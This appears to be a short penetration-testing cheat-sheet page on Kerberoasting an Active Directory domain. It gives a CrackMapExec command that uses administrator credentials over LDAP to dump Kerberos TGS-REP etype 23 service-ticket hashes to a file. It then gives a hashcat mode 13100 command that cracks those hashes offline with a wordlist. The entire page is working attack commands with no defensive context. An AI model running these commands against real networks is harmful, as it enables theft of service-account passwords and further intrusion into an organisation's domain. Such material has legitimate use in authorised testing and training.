---
description: >-
  Kerberoasting with CrackMapExec - Retrieve the Kerberos 5 TGS-REP etype 23
  hash
---

# 🟠 Kerberoasting

{% code overflow="wrap" %}
```
crackmapexec ldap 192.168.1.119 -u Administrator -p 'Password!' --kerberoasting output.txt
```
{% endcode %}

### Crack The Hash

```
hashcat -m 13100 output.txt wordlist.txt
```
